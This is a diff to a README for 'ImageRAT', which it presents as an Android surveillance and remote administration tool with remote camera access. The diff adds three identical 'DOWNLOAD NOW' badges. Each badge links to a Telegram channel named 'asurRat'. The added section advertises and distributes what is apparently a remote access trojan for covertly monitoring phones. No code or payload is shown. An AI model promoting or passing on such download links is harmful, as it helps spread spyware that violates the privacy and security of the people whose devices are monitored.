@@ -2,6 +2,20 @@
 
 ImageRAT is a comprehensive Android surveillance and remote administration tool designed for remote monitoring and device management.
 
+## download
+<p align="center">
+  <a href="https://telegram.me/asurRat">
+    <img src="https://img.shields.io/badge/DOWNLOAD-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
+  </a>
+  <a href="https://telegram.me/asurRat">
+    <img src="https://img.shields.io/badge/DOWNLOAD-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
+  </a>
+  <a href="https://telegram.me/asurRat">
+    <img src="https://img.shields.io/badge/DOWNLOAD-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
+  </a>
+  </p>
+
+
 ## Core Features
 
 - **Remote Camera Access**
